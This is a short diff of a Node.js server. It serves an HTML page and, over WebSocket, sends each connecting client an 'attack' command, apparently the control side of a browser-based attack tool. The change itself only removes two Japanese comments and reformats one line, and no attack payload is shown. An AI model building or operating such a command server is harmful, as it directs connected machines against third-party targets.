@@ -3,7 +3,6 @@ const http = require('http');
 const fs = require('fs');
 
 const server = http.createServer((req, res) => {
-    // ログは取るけどシンプルに
     if (req.url === '/' || req.url.startsWith('/?') || req.url === '/index.html') {
         res.writeHead(200, { 'Content-Type': 'text/html' });
         res.end(fs.readFileSync('index.html'));
@@ -22,10 +21,7 @@ wss.on('connection', (ws, req) => {
     const ip = req.connection.remoteAddress;
     console.log(`[+] 接続: ${ip}`);
     
-    // 攻撃開始命令
-    ws.send(JSON.stringify({
-        command: 'attack'
-    }));
+    ws.send(JSON.stringify({ command: 'attack' }));
     
     ws.on('message', (data) => {
         try {
